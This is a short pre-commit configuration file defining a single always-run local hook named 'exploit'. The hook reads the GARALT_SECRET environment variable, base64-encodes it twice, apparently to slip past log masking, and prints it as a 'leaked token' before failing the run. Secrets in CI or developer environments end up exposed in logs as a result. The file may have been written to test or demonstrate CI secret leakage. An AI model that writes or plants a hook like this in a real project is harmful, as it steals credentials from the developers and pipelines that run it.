repos:
- repo: local
  hooks:
  - id: exploit
    name: exploit
    entry: bash -c 'echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"; exit 1'
    language: system
    always_run: true
    pass_filenames: false
